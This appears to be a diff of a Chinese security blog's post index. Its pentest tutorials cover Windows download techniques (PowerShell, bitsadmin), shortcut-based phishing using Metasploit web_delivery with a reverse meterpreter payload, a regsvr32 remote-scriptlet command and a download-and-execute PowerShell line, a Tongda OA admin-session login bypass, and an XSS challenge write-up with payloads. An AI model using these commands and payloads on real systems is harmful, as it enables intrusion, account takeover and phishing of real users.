+<p><img src="/posts/31532/2.png" alt></p>
+<h2 id="0x02-Powershel"><a href="#0x02-Powershel" class="headerlink" title="0x02 Powershel"></a>0x02 Powershel</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -ExecutionPolicy Bypass -File .\test.ps1</span><br></pre></td></tr></table></figure>
+<p>test.ps1内容：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$d &#x3D; New-Object System.Net.WebClient</span><br><span class="line">$d.DownloadFile(&quot;http:&#x2F;&#x2F;192.168.72.14&#x2F;1.bat&quot;,&quot;1.bat&quot;)</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/31532/3.png" alt></p>
+<h2 id="0x03-bitsadmin"><a href="#0x03-bitsadmin" class="headerlink" title="0x03 bitsadmin"></a>0x03 bitsadmin</h2><p>第一种</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
+<p>第二种</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer getfile http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
+<p>第三种</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer getpayload http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
+<p>第四种</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer aa http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
+<p>第五种</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;create aa</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;addfile qianxiao996 http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;resume aa</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;info aa &#x2F;verbose</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;complete aa</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>内网渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -3195,6 +3195,26 @@ string substr(string, start, length)
 ]]></content>
   </entry>
   <entry>
+    <title>日常记录</title>
+    <url>/posts/42951.html</url>
+    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">输入密码，查看文章！</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="41aa21adb5d64708478469f7449c1f1b56305b5083482172dd3089ae0feb477a">3d75ff7bf02d65c827ba26514996c5344351978a48ad548581ba91cb199999d379eaf14eeced186b0939c7a5eb58a43f6466362dc3915c452b87ba1a7ba7f8a0a0fb87e6bf95daed31ceff7b31459cdd29726e8cbed861f54de77566bd2683cc8dc0f5ce69ab35817378e291c42479f3aaa78e29a3f2900b0a63871b7501ce76b4765a29778cc8939d5c9145d08f39cecf5a305614daede94b2f7ce4ed7c2f77396cde9c268487fb8021be204689c5e97e1d1ebc4d686f2aa885b557327d005316d3cb4598223f60772f4c6619e17860</script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+</div>
+<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>总结</category>
+      </categories>
+      <tags>
+        <tag>备忘录</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件泄露漏洞</title>
     <url>/posts/56132.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前两天刚做了一道<code>.git</code>文件泄露的题，在网上查了些资料，发现还有其他的文件泄露漏洞，现在来总结一下。</p>
@@ -3226,26 +3246,6 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
-    <title>日常记录</title>
-    <url>/posts/42951.html</url>
-    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <div class="hbe-input-container">
-  <input type="password" id="hbePass" placeholder="" />
-    <label for="hbePass">输入密码，查看文章！</label>
-    <div class="bottom-line"></div>
-  </div>
-  <script id="hbeData" type="hbeData" data-hmacdigest="41aa21adb5d64708478469f7449c1f1b56305b5083482172dd3089ae0feb477a">3d75ff7bf02d65c827ba26514996c5344351978a48ad548581ba91cb199999d379eaf14eeced186b0939c7a5eb58a43f6466362dc3915c452b87ba1a7ba7f8a0a0fb87e6bf95daed31ceff7b31459cdd29726e8cbed861f54de77566bd2683cc8dc0f5ce69ab35817378e291c42479f3aaa78e29a3f2900b0a63871b7501ce76b4765a29778cc8939d5c9145d08f39cecf5a305614daede94b2f7ce4ed7c2f77396cde9c268487fb8021be204689c5e97e1d1ebc4d686f2aa885b557327d005316d3cb4598223f60772f4c6619e17860</script>
-  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
-</div>
-<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>总结</category>
-      </categories>
-      <tags>
-        <tag>备忘录</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>日志</title>
     <url>/posts/32353.html</url>
     <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
@@ -3266,20 +3266,6 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
-    <title>易错知识</title>
-    <url>/posts/34260.html</url>
-    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <div class="hbe-input-container">
-  <input type="password" id="hbePass" placeholder="" />
-    <label for="hbePass">输入密码，查看文章！</label>
-    <div class="bottom-line"></div>
-  </div>
-  <script id="hbeData" type="hbeData" data-hmacdigest="f4f25515922814b31789af777e8cc081f949bd50de753aaf64e1e2b4b1866cac">8de2c04a2d70dba63f65a56a98175f4a</script>
-  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
-</div>
-<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
-  </entry>
-  <entry>
     <title>构造windows快捷方式钓鱼信</title>
     <url>/posts/44104.html</url>
     <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>关于windows快捷方式,想必这里就不用再多说了,大家应该已经非常了解才是,说白点,它其实就是一种路径映射而已,而我们利用的也正是这种特性,触发细节很简单,这里不妨简单回顾下,当我们双击打开一个windows快捷方式时内部到底都发生了些什么,首先,windows会根据快捷方式中指定的路径去触发执行相应的程序,假如我们指向的是一个包含恶意的payload路径,那结果就可想而知,payload肯定会被正常执行</p>
@@ -3296,6 +3282,20 @@ string substr(string, start, length)
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery </span><br><span class="line">msf &gt; set target  3</span><br><span class="line">msf &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp_rc4_dns </span><br><span class="line">msf &gt; set lhost 192.168.3.29</span><br><span class="line">msf &gt; set lport 82</span><br><span class="line">msf &gt; set rc4password  klionsec</span><br><span class="line">msf exploit(multi&#x2F;script&#x2F;web_delivery) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.3.29:82 </span><br><span class="line">msf exploit(multi&#x2F;script&#x2F;web_delivery) &gt; [*] Using URL: http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;qQJvcDScrbA</span><br><span class="line">[*] Local IP: http:&#x2F;&#x2F;192.168.3.29:8080&#x2F;qQJvcDScrbA</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.3.29:8080&#x2F;qQJvcDScrbA.sct scrobj.dll	将此命令单独写到meter.txt文件中去生成快捷方式</span><br></pre></td></tr></table></figure>
 <p>生成快捷方式，双击执行</p>
 <h2 id="0x03-借助windows快捷方式实现自定义木马上线"><a href="#0x03-借助windows快捷方式实现自定义木马上线" class="headerlink" title="0x03 借助windows快捷方式实现自定义木马上线"></a>0x03 借助windows快捷方式实现自定义木马上线</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe (New-Object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.72.23&#x2F;&#x2F;PsExec.exe&#39;,&#39;c:\\temp\\PsExec.exe&#39;);(New-Object -com Shell.Application).ShellExecute(&#39;c:\\temp\\PsExec.exe&#39;)</span><br></pre></td></tr></table></figure>]]></content>
+  </entry>
+  <entry>
+    <title>易错知识</title>
+    <url>/posts/34260.html</url>
+    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">输入密码，查看文章！</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="f4f25515922814b31789af777e8cc081f949bd50de753aaf64e1e2b4b1866cac">8de2c04a2d70dba63f65a56a98175f4a</script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+</div>
+<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
   </entry>
   <entry>
     <title>正则表达式</title>
@@ -3461,58 +3461,6 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
-    <title>通达OA任意用户登录复现</title>
-    <url>/posts/51745.html</url>
-    <content><![CDATA[<p><img src="/posts/51745/login.png" alt="login"></p>
-<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>通达OA是北京通达信科科技有限公司出品的 “Office Anywhere 通达网络智能办公系统”。<br>该漏洞可获取任意用户session，包括系统管理员。</p>
-<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通达OA 2017</span><br><span class="line">V11.3 &lt; V11.5</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本次实验所用版本是<code>通达V11.3</code></p>
-<p>链接：<a href="https://pan.baidu.com/s/1nm-kBi4zOwXDZFtjmf7n2Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1nm-kBi4zOwXDZFtjmf7n2Q</a></p>
-<p>提取码：z863</p>
-<p>下载好源码，解压缩后直接运行exe文件安装，访问靶机IP即可，界面如上图。</p>
-<p>本机IP：<code>192.168.150.142</code></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
-<li><p>登录页面直接抓包</p>
-<p><img src="/posts/51745/logincheck.png" alt="logincheck"></p>
-</li>
-<li><p>此处需要修改3个地方</p>
-<ol>
-<li><code>/logincheck.php</code> 修改为 <code>logincheck_code.php</code></li>
-<li>删除<code>Cookie</code>，否则不会返回<code>PHPSESSID</code></li>
-<li>在<code>POST</code>处添加 <code>&amp;UID=1</code>，代表管理员</li>
-</ol>
-<p><img src="/posts/51745/get_sessid.png" alt="get_sessid"></p>
-<p>成功获取PHPSESSID。</p>
-</li>
-<li><p>利用获得的<code>PHPSESSID</code>登录</p>
-<p>访问<code>http://192.168.150.142/general/index.php</code>抓包并替换<code>PHPSESSID</code></p>
-<p>或者</p>
-<p>访问<code>http://192.168.150.142/general/index.php</code>直接F12，修改<code>PHPSESSID</code>，然后刷新即可登录。</p>
-<p><img src="/posts/51745/success.png" alt="success"></p>
-</li>
-</ul>
-<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>poc地址：<a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User" target="_blank" rel="noopener">点我</a></p>
-<p>使用方法：</p>
-<ol>
-<li><p>运行poc</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 POC.py -v 版本 -url url</span><br><span class="line">&#x2F;&#x2F; 版本：11 或 2017</span><br><span class="line">&#x2F;&#x2F; url: IP 或 http:&#x2F;&#x2F;IP</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>获取到可用的SESSIONID</p>
-</li>
-<li><p>替换浏览器Cookie中的SESSIONID即可实现登录为admin</p>
-</li>
-</ol>
-<p><img src="/posts/51745/poc.png" alt="poc"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>通达OA任意文件上传+文件包含导致RCE漏洞复现</title>
     <url>/posts/38272.html</url>
     <content><![CDATA[<img src="/posts/38272/home.png" alt="home" style="zoom:80%;">
@@ -3565,6 +3513,58 @@ string substr(string, start, length)
 <h2 id="0x07参考"><a href="#0x07参考" class="headerlink" title="0x07参考"></a>0x07参考</h2><p><a href="http://blog.fuzz.pub/2020/03/17/通达oa%20RCE%20分析/" target="_blank" rel="noopener">通达OA RCE分析</a></p>
 <p><a href="https://github.com/jas502n/OA-tongda-RCE" target="_blank" rel="noopener">POC</a></p>
 <p><a href="https://www.cnblogs.com/-qing-/p/10944118.html" target="_blank" rel="noopener">bypass disable_funcation</a></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>通达OA任意用户登录复现</title>
+    <url>/posts/51745.html</url>
+    <content><![CDATA[<p><img src="/posts/51745/login.png" alt="login"></p>
+<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>通达OA是北京通达信科科技有限公司出品的 “Office Anywhere 通达网络智能办公系统”。<br>该漏洞可获取任意用户session，包括系统管理员。</p>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通达OA 2017</span><br><span class="line">V11.3 &lt; V11.5</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本次实验所用版本是<code>通达V11.3</code></p>
+<p>链接：<a href="https://pan.baidu.com/s/1nm-kBi4zOwXDZFtjmf7n2Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1nm-kBi4zOwXDZFtjmf7n2Q</a></p>
+<p>提取码：z863</p>
+<p>下载好源码，解压缩后直接运行exe文件安装，访问靶机IP即可，界面如上图。</p>
+<p>本机IP：<code>192.168.150.142</code></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
+<li><p>登录页面直接抓包</p>
+<p><img src="/posts/51745/logincheck.png" alt="logincheck"></p>
+</li>
+<li><p>此处需要修改3个地方</p>
+<ol>
+<li><code>/logincheck.php</code> 修改为 <code>logincheck_code.php</code></li>
+<li>删除<code>Cookie</code>，否则不会返回<code>PHPSESSID</code></li>
+<li>在<code>POST</code>处添加 <code>&amp;UID=1</code>，代表管理员</li>
+</ol>
+<p><img src="/posts/51745/get_sessid.png" alt="get_sessid"></p>
+<p>成功获取PHPSESSID。</p>
+</li>
+<li><p>利用获得的<code>PHPSESSID</code>登录</p>
+<p>访问<code>http://192.168.150.142/general/index.php</code>抓包并替换<code>PHPSESSID</code></p>
+<p>或者</p>
+<p>访问<code>http://192.168.150.142/general/index.php</code>直接F12，修改<code>PHPSESSID</code>，然后刷新即可登录。</p>
+<p><img src="/posts/51745/success.png" alt="success"></p>
+</li>
+</ul>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>poc地址：<a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User" target="_blank" rel="noopener">点我</a></p>
+<p>使用方法：</p>
+<ol>
+<li><p>运行poc</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 POC.py -v 版本 -url url</span><br><span class="line">&#x2F;&#x2F; 版本：11 或 2017</span><br><span class="line">&#x2F;&#x2F; url: IP 或 http:&#x2F;&#x2F;IP</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取到可用的SESSIONID</p>
+</li>
+<li><p>替换浏览器Cookie中的SESSIONID即可实现登录为admin</p>
+</li>
+</ol>
+<p><img src="/posts/51745/poc.png" alt="poc"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -4019,6 +4019,126 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
+    <title>XSS靶场练习一</title>
+    <url>/posts/32710.html</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶场地址：<a href="https://alf.nu/alert1" target="_blank" rel="noopener">alert(1) to win</a></p>
+<h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span>+s+<span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>代码将输入直接拼接到了返回的字符串中，没有任何过滤，直接闭合<code>console.log(&quot;</code>即可。</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">13个字符</span><br><span class="line">&quot;);alert(1)&#x2F;&#x2F;</span><br><span class="line">12个字符</span><br><span class="line">&quot;);alert(1,&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Adobe"><a href="#Adobe" class="headerlink" title="Adobe"></a>Adobe</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s &#x3D; s.replace(&#x2F;&quot;&#x2F;g, &#39;\\&quot;&#39;);</span><br><span class="line">  return &#39;&lt;script&gt;console.log(&quot;&#39; + s + &#39;&quot;);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><img src="/posts/32710/1.png" alt="replace"></p>
+<p>代码将输入的双引号加了一个<code>\</code>进行了转义，这样我们就不能像第一题那样闭合<code>console.log</code>了，但是没啥影响，有两种方法：</p>
+<ul>
+<li>闭合之前的<code>&lt;script&gt;</code>，然后再写一个<code>&lt;script&gt;</code></li>
+<li>使用<code>\</code>来转义对<code>&quot;</code>进行转义的<code>\</code>，从而绕过对<code>&quot;</code>的过滤</li>
+</ul>
+<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方法一</span><br><span class="line">&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&#x2F;&#x2F;</span><br><span class="line">方法二</span><br><span class="line">\&quot;);alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s &#x3D; JSON.stringify(s);</span><br><span class="line">  return &#39;&lt;script&gt;console.log(&#39; + s + &#39;);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p><img src="/posts/32710/2.png" alt="JSON.stringify"></p>
+<p>代码将输入使用<code>JSON.stringify</code>进行了处理，与第二题的方法一思路相同。</p>
+<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h2><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  var text &#x3D; s.replace(&#x2F;&lt;&#x2F;g, &#39;&lt;&#39;).replace(&#x2F;&quot;&#x2F;g, &#39;&quot;&#39;);</span><br><span class="line">  &#x2F;&#x2F; URLs</span><br><span class="line">  text &#x3D; text.replace(&#x2F;(http:\&#x2F;\&#x2F;\S+)&#x2F;g, &#39;&lt;a href&#x3D;&quot;$1&quot;&gt;$1&lt;&#x2F;a&gt;&#39;);</span><br><span class="line">  &#x2F;&#x2F; [[img123|Description]]</span><br><span class="line">  text &#x3D; text.replace(&#x2F;\[\[(\w+)\|(.+?)\]\]&#x2F;g, &#39;&lt;img alt&#x3D;&quot;$2&quot; src&#x3D;&quot;$1.gif&quot;&gt;&#39;);</span><br><span class="line">  return text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>代码进行了三步操作</p>
+<ol>
+<li>第一步，将<code>&lt;</code>和<code>&quot;</code>转成了HTML实体</li>
+<li>第二步，如果存在<code>http://</code>的字符串， 会可以生成一个<code>a</code>标签</li>
+<li>第三步，解析Markdown的图片的语法，如果存在<code>[[img123|Description]]</code>格式的字符串，则变为``。</li>
+</ol>
+<p>开头对<code>&quot;</code>和<code>&lt;</code>进行了编码操作，所以不能直接传入<code>&quot;</code>来闭合，当前思路就是构造一个字符串，使其满足后两个正则，从而引入<code>a</code>标签中的<code>&quot;</code>，从而闭合<code>img</code>标签的<code>alt</code>属性。</p>
+<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[[a|http:&#x2F;&#x2F;onerror&#x3D;alert(1)&#x2F;&#x2F;]]</span><br></pre></td></tr></table></figure>
+
+<h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">    &#x2F;&#x2F; Slightly too lazy to make two input fields.</span><br><span class="line">    &#x2F;&#x2F; Pass in something like &quot;TextNode#foo&quot;</span><br><span class="line">    var m &#x3D; s.split(&#x2F;#&#x2F;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Only slightly contrived at this point.</span><br><span class="line">    var a &#x3D; document.createElement(&#39;div&#39;);</span><br><span class="line">    a.appendChild(document[&#39;create&#39; + m[0]].apply(document, m.slice(1)));</span><br><span class="line">    return a.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>代码实现了一个根据输入来创建的<code>DOM</code>节点的功能。<br>如果输入是<code>TextNode#foo</code>，那么执行的代码就是<code>document.createTextNode(&quot;foo&quot;)</code>。</p>
+<p><strong>常用命令</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">createElement() 创建一个元素节点</span><br><span class="line">createTextNode() 创建一个文本节点</span><br><span class="line">createAttribute() 创建一个属性节点</span><br><span class="line">createComment() 创建一个注释节点</span><br></pre></td></tr></table></figure>
+
+<p>经过尝试，通过<code>createComment()</code>创建一个注释节点，然后闭合注释可以达到代码执行的目的。</p>
+<h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">34个字符</span><br><span class="line">Comment#&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">32个字符</span><br><span class="line">Comment#&gt;&lt;iframe onload&#x3D;alert(1)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Callback"><a href="#Callback" class="headerlink" title="Callback"></a>Callback</h2><h3 id="源码-5"><a href="#源码-5" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  &#x2F;&#x2F; Pass inn &quot;callback#userdata&quot;</span><br><span class="line">  var thing &#x3D; s.split(&#x2F;#&#x2F;); </span><br><span class="line"></span><br><span class="line">  if (!&#x2F;^[a-zA-Z\[\]&#39;]*$&#x2F;.test(thing[0])) return &#39;Invalid callback&#39;;</span><br><span class="line">  var obj &#x3D; &#123;&#39;userdata&#39;: thing[1] &#125;;</span><br><span class="line">  var json &#x3D; JSON.stringify(obj).replace(&#x2F;&lt;&#x2F;g, &#39;\\u003c&#39;);</span><br><span class="line">  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>代码首先将输入的字符串按照<code>#</code>分割为两部分，第一部分是回调函数，只能使用大小写字母、<code>[</code>、<code>]</code>、<code>&#39;</code>，第二部分是<code>JSON</code>数据。<br>而且后面又将<code>JSON</code>数据中的尖括号转义成了<code>\\u003c</code>。<br>最终的目的依旧是执行<code>JS</code>代码，<code>thing[0]</code>部分不一定是一个函数，只要满足要求就OK。<br>既然回调函数名部分和后面的值都没有过滤单引号，可以在前后放两个单引号，从而闭合它们之间的值。再加个分号作为分割，后面就好操作了。</p>
+<h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;#&#39;;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Skandia"><a href="#Skandia" class="headerlink" title="Skandia"></a>Skandia</h2><h3 id="源码-6"><a href="#源码-6" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  return &#39;&lt;script&gt;console.log(&quot;&#39; + s.toUpperCase() + &#39;&quot;)&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h2><p>闭合<code>&lt;script&gt;</code>标签，但是方法<code>alert(1)</code>，被转换成大写了，无法执行，尝试编码绕过。</p>
+<h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&#x2F;script&gt;&lt;img src onerror&#x3D;&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h2><h3 id="源码-7"><a href="#源码-7" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  function htmlEscape(s) &#123;</span><br><span class="line">    return s.replace(&#x2F;.&#x2F;g, function(x) &#123;</span><br><span class="line">       return &#123; &#39;&lt;&#39;: &#39;&lt;&#39;, &#39;&gt;&#39;: &#39;&gt;&#39;, &#39;&amp;&#39;: &#39;&amp;&#39;, &#39;&quot;&#39;: &#39;&quot;&#39;, &quot;&#39;&quot;: &#39;&#39;&#39; &#125;[x] || x;       </span><br><span class="line">     &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function expandTemplate(template, args) &#123;</span><br><span class="line">    return template.replace(</span><br><span class="line">        &#x2F;&#123;(\w+)&#125;&#x2F;g, </span><br><span class="line">        function(_, n) &#123; </span><br><span class="line">           return htmlEscape(args[n]);</span><br><span class="line">         &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  return expandTemplate(</span><br><span class="line">    &quot;                                                \n\</span><br><span class="line">      &lt;h2&gt;Hello, &lt;span id&#x3D;name&gt;&lt;&#x2F;span&gt;!&lt;&#x2F;h2&gt;         \n\</span><br><span class="line">      &lt;script&gt;                                       \n\</span><br><span class="line">         var v &#x3D; document.getElementById(&#39;name&#39;);    